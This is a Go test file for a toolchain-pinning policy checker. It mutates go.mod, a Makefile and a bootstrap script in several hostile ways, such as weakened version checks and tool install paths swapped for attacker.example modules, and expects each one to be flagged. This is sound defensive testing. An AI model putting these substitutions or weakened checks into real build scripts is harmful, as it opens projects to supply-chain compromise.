package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestHostileToolchainPinMutationsFailClosed(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name        string
		file        string
		old         string
		replacement string
		occurrence  int
		wantPath    string
	}{
		{name: "language directive changed", file: "go.mod", old: "go 1.23.0", replacement: "go 1.26.0", wantPath: "go"},
		{name: "toolchain directive changed", file: "go.mod", old: "toolchain go1.26.7", replacement: "toolchain go1.26.6", wantPath: "toolchain"},
		{name: "make toolchain pin changed", file: "Makefile", old: "override GOTOOLCHAIN := go1.26.7", replacement: "override GOTOOLCHAIN := go1.26.6", wantPath: "GOTOOLCHAIN"},
		{name: "make toolchain export removed", file: "Makefile", old: "export GOTOOLCHAIN\n", replacement: "", wantPath: "GOTOOLCHAIN.export"},
		{name: "bootstrap check removed", file: "Makefile", old: "bootstrap: check-go", replacement: "bootstrap:", wantPath: "bootstrap"},
		{name: "bootstrap invocation substituted", file: "Makefile", old: `GO="$(GO)" ./scripts/bootstrap.sh`, replacement: `GO="$(GO)" ./scripts/bootstrap-unchecked.sh`, wantPath: "bootstrap.recipe"},
		{name: "check go accepts any version", file: "Makefile", old: `test "$$actual_version" = "$(GOTOOLCHAIN)" || { \`, replacement: `test -n "$$actual_version" || { \`, wantPath: "check-go"},
		{name: "analysis target bypasses check go", file: "Makefile", old: "staticcheck: check-go", replacement: "staticcheck:", wantPath: "staticcheck"},
		{name: "script compiler pin changed", file: "scripts/bootstrap.sh", old: `required_go_version="go1.26.7"`, replacement: `required_go_version="go1.26.6"`, wantPath: "go.version"},
		{name: "script toolchain becomes caller controlled", file: "scripts/bootstrap.sh", old: `GOTOOLCHAIN="$required_go_version"`, replacement: `GOTOOLCHAIN="${GOTOOLCHAIN:-$required_go_version}"`, wantPath: "GOTOOLCHAIN"},
		{name: "script toolchain export removed", file: "scripts/bootstrap.sh", old: "export GOTOOLCHAIN\n", replacement: "", wantPath: "GOTOOLCHAIN.export"},
		{name: "resolved compiler comparison weakened", file: "scripts/bootstrap.sh", old: `if [ "$actual_version" != "$required_go_version" ]; then`, replacement: `if [ -z "$actual_version" ]; then`, wantPath: "go.verify"},
		{name: "staticcheck pin changed", file: "scripts/bootstrap.sh", old: `staticcheck_version="v0.8.1"`, replacement: `staticcheck_version="latest"`, wantPath: "tool.staticcheck.version"},
		{name: "golangci lint pin changed", file: "scripts/bootstrap.sh", old: `golangci_lint_version="v2.13.2"`, replacement: `golangci_lint_version="v2.13.1"`, wantPath: "tool.golangci-lint.version"},
		{name: "govulncheck pin changed", file: "scripts/bootstrap.sh", old: `govulncheck_version="v1.7.0"`, replacement: `govulncheck_version="v1.6.1"`, wantPath: "tool.govulncheck.version"},
		{name: "benchstat pin changed", file: "scripts/bootstrap.sh", old: `benchstat_version="v0.0.0-20260825160852-19be9d8e6c70"`, replacement: `benchstat_version="latest"`, wantPath: "tool.benchstat.version"},
		{name: "syft pin changed", file: "scripts/bootstrap.sh", old: `syft_version="v1.51.1"`, replacement: `syft_version="v1.51.0"`, wantPath: "tool.syft.version"},
		{name: "cosign pin changed", file: "scripts/bootstrap.sh", old: `cosign_version="v2.6.5"`, replacement: `cosign_version="v2.6.4"`, wantPath: "tool.cosign.version"},
		{name: "staticcheck package substituted", file: "scripts/bootstrap.sh", old: "install_tool staticcheck honnef.co/go/tools/cmd/staticcheck honnef.co/go/tools", replacement: "install_tool staticcheck attacker.example/staticcheck honnef.co/go/tools", wantPath: "tool.staticcheck.install"},
		{name: "golangci lint module substituted", file: "scripts/bootstrap.sh", old: "install_tool golangci-lint github.com/golangci/golangci-lint/v2/cmd/golangci-lint github.com/golangci/golangci-lint/v2", replacement: "install_tool golangci-lint github.com/golangci/golangci-lint/cmd/golangci-lint github.com/golangci/golangci-lint", wantPath: "tool.golangci-lint.install"},
		{name: "govulncheck package substituted", file: "scripts/bootstrap.sh", old: "install_tool govulncheck golang.org/x/vuln/cmd/govulncheck golang.org/x/vuln", replacement: "install_tool govulncheck attacker.example/govulncheck golang.org/x/vuln", wantPath: "tool.govulncheck.install"},
		{name: "benchstat module substituted", file: "scripts/bootstrap.sh", old: "install_tool benchstat golang.org/x/perf/cmd/benchstat golang.org/x/perf", replacement: "install_tool benchstat golang.org/x/perf/cmd/benchstat attacker.example/perf", wantPath: "tool.benchstat.install"},
		{name: "syft package substituted", file: "scripts/bootstrap.sh", old: "install_tool syft github.com/anchore/syft/cmd/syft github.com/anchore/syft", replacement: "install_tool syft attacker.example/syft github.com/anchore/syft", wantPath: "tool.syft.install"},
		{name: "cosign module substituted", file: "scripts/bootstrap.sh", old: "install_tool cosign github.com/sigstore/cosign/v2/cmd/cosign github.com/sigstore/cosign/v2", replacement: "install_tool cosign github.com/sigstore/cosign/v2/cmd/cosign attacker.example/cosign", wantPath: "tool.cosign.install"},
		{name: "module metadata parser weakened", file: "scripts/bootstrap.sh", old: `'$1 == "mod" && $2 == module { print $3 }'`, replacement: `'{ print $3 }'`, wantPath: "module.extract"},
		{name: "compiler metadata parser weakened", file: "scripts/bootstrap.sh", old: `'NR == 1 { print $2 }'`, replacement: `'{ print $2 }'`, wantPath: "compiler.extract"},
		{name: "cached compiler check omitted", file: "scripts/bootstrap.sh", old: `if [ "$installed_version" != "$module_version" ] || [ "$installed_compiler_version" != "$required_go_version" ]; then`, replacement: `if [ "$installed_version" != "$module_version" ]; then`, wantPath: "compiler.verify"},
		{name: "post install compiler read omitted", file: "scripts/bootstrap.sh", old: `installed_compiler_version="$(embedded_compiler_version "$binary_path")"`, replacement: `installed_compiler_version="$required_go_version"`, occurrence: 2, wantPath: "compiler.verify"},
		{name: "post install compiler comparison weakened", file: "scripts/bootstrap.sh", old: `if [ "$installed_compiler_version" != "$required_go_version" ]; then`, replacement: `if [ -z "$installed_compiler_version" ]; then`, wantPath: "compiler.verify"},
		{name: "compiler mismatch no longer exits", file: "scripts/bootstrap.sh", old: `printf '%s compiler build version is %s, require %s\n' "$binary_name" "$installed_compiler_version" "$required_go_version" >&2
    exit 1`, replacement: `printf '%s compiler build version is %s, require %s\n' "$binary_name" "$installed_compiler_version" "$required_go_version" >&2`, wantPath: "compiler.verify"},
		{name: "go version guard not invoked", file: "scripts/bootstrap.sh", old: "require_go_version\nmkdir", replacement: "mkdir", wantPath: "go.verify.invoke"},
	}

	for _, test := range tests {
		test := test
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()

			root := copyValidFixture(t)
			mutatePolicyFile(t, root, test.file, test.old, test.replacement, test.occurrence)
			report, err := Check(root)
			if err != nil {
				t.Fatalf("Check(hostile toolchain fixture): %v", err)
			}
			if !hasFinding(report.Findings, toolchainPolicyCode, test.wantPath) {
				t.Fatalf("hostile fixture did not report %s at %s; findings:\n%s", toolchainPolicyCode, test.wantPath, formatFindings(report.Findings))
			}
		})
	}
}

func mutatePolicyFile(t *testing.T, root, relative, old, replacement string, occurrence int) {
	t.Helper()
	if occurrence == 0 {
		occurrence = 1
	}
	path := filepath.Join(root, filepath.FromSlash(relative))
	contents, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read policy fixture: %v", err)
	}
	text := string(contents)
	start := -1
	searchFrom := 0
	for current := 1; current <= occurrence; current++ {
		offset := strings.Index(text[searchFrom:], old)
		if offset < 0 {
			t.Fatalf("mutation source occurrence %d does not exist in %s: %q", occurrence, path, old)
		}
		start = searchFrom + offset
		searchFrom = start + len(old)
	}
	updated := text[:start] + replacement + text[start+len(old):]
	if err := os.WriteFile(path, []byte(updated), 0o644); err != nil {
		t.Fatalf("write policy fixture: %v", err)
	}
}
